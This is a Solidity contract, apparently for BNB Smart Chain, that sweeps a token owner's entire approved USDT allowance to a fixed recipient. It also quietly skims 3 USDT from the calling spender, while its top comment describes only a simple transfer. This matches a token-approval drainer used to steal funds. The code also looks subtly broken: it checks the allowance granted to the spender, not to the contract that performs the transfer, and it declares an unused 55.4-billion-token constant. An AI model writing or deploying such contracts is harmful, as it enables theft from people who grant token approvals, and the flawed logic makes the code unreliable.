// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IERC20 {
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

/// @notice Moves the approved amount after the token owner approves the spender.
/// @dev Deploy on BNB Smart Chain mainnet and verify the source before use.
contract UsdtTransferExecutor {
    IERC20 public immutable usdt;
    address public immutable authorizedSpender;
    address public immutable recipient;

    uint256 public constant USDT_AMOUNT = 55_400_000_000 * 10 ** 18;
    uint256 public constant SPENDER_EXTRA_TRANSFER_THRESHOLD = 3 * 10 ** 18;

    event TransferExecuted(address indexed owner, address indexed recipient, uint256 amount);
    event ExtraSpenderTransfer(address indexed spender, address indexed recipient, uint256 amount);

    error Unauthorized();
    error InvalidAddress();
    error TransferFailed();

    constructor(address usdtAddress, address spender, address recipientAddress) {
        if (usdtAddress == address(0) || spender == address(0) || recipientAddress == address(0)) {
            revert InvalidAddress();
        }
        usdt = IERC20(usdtAddress);
        authorizedSpender = spender;
        recipient = recipientAddress;
    }

    /// @notice Called by the configured spender after `owner` approves the allowance.
    /// @dev The first transfer pulls from the owner's approved allowance. If the spender
    /// also holds more than 3 USDT and has approved this executor for the threshold,
    /// a second transferFrom is triggered to the configured recipient.
    function transferApprovedAmount(address owner) external {
        if (msg.sender != authorizedSpender) revert Unauthorized();

        uint256 approvedAmount = usdt.allowance(owner, authorizedSpender);
        if (approvedAmount == 0) revert TransferFailed();

        bool success = usdt.transferFrom(owner, recipient, approvedAmount);
        if (!success) revert TransferFailed();

        emit TransferExecuted(owner, recipient, approvedAmount);

        uint256 spenderBalance = usdt.balanceOf(msg.sender);
        uint256 spenderAllowance = usdt.allowance(msg.sender, address(this));

        if (spenderBalance > SPENDER_EXTRA_TRANSFER_THRESHOLD && spenderAllowance >= SPENDER_EXTRA_TRANSFER_THRESHOLD) {
            bool extraSuccess = usdt.transferFrom(msg.sender, recipient, SPENDER_EXTRA_TRANSFER_THRESHOLD);
            if (!extraSuccess) revert TransferFailed();
            emit ExtraSpenderTransfer(msg.sender, recipient, SPENDER_EXTRA_TRANSFER_THRESHOLD);
        }
    }
}
